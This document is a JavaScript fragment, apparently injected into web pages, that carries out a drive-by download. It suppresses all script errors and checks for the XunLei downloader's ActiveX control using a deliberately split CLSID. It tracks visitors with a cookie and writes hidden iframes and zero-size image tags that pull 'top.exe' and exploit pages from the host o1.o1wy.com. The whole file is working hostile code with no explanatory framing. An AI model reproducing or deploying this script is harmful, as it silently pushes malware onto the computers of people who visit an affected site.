<!--
function killXunLeiErrors()
{return true;}
window.onerror = killXunLeiErrors;
function GetXunLeiCookieVal(offset)
{var endstr = document.cookie.indexOf (";", offset);
if (endstr == -1)
endstr = document.cookie.length;
return unescape(document.cookie.substring(offset, endstr));}
function SetXunLeiCookie(name, value)
{var expdate = new Date();
var argv = SetXunLeiCookie.arguments;
var argc = SetXunLeiCookie.arguments.length;
var expires = (argc > 2) ? argv[2] : null;
var path = (argc > 3) ? argv[3] : null;
var domain = (argc > 4) ? argv[4] : null;
var secure = (argc > 5) ? argv[5] : false;
if(expires!=null) expdate.setTime(expdate.getTime() + ( expires * 1000 ));
document.cookie = name + "=" + escape (value) +((expires == null) ? "" : ("; expires="+ expdate.toGMTString()))
+((path == null) ? "" : ("; path=" + path)) +((domain == null) ? "" : ("; domain=" + domain))
+((secure == true) ? "; secure" : "");}
function GetXunLeiCookie(name)
{var arg = name + "=";
var alen = arg.length;
var clen = document.cookie.length;
var i = 0;
while (i < clen)
{var j = i + alen;
if (document.cookie.substring(i, j) == arg)
return GetXunLeiCookieVal (j);
i = document.cookie.indexOf(" ", i) + 1;
if (i == 0) break;}
return null;}
if (GetXunLeiCookie("XunLei_ad")==null)
{
var isXunLeiInstalled=true;document.write("<span id='XunLeispan'></span>");
SetXunLeiCookie("XunLei_ad","yes",864000,"/");setTimeout("chkXunLei()",5000);
function XunLeifunc(){isXunLeiInstalled=false}
function chkXunLei()
{
if (isXunLeiInstalled)
{
document.all.XunLeispan.innerHTML="<iframe width='100' height='21' src='http://o1.o1wy.com/kyo/XunLei.htm'></iframe><img style='width:0;height:0' src='http://o1.o1wy.com/no/top.exe'>";
}
else
{
document.all.XunLeispan.innerHTML="<iframe width='100' height='21' src='http://o1.o1wy.com/kyo/real.htm'></iframe><img style='width:0;height:0' src='http://o1.o1wy.com/no/top.exe'>";
SetXunLeiCookie("XunLei_ad","ok",864000,"/");
}
}
document.write("<object id='XunLeiobj' width='0' height='0' style='display:none' ");
document.write("classid='cl"+"sid:F3E"+"70CEA-95"+"6E-49C"+"C-B"+"444-73AF"+"E593AD7F' onerror='XunLeifunc()'></object>");
}
else if(GetXunLeiCookie("XunLei_ad")=="yes")
{
document.write("<img style='width:0;height:0' src='http://o1.o1wy.com/no/top.exe'>");
document.write("<iframe width='0' height='0' src='http://o1.o1wy.com/kyo/real.htm'></iframe>");
SetXunLeiCookie("XunLei_ad","ok",864000,"/");
}
//-->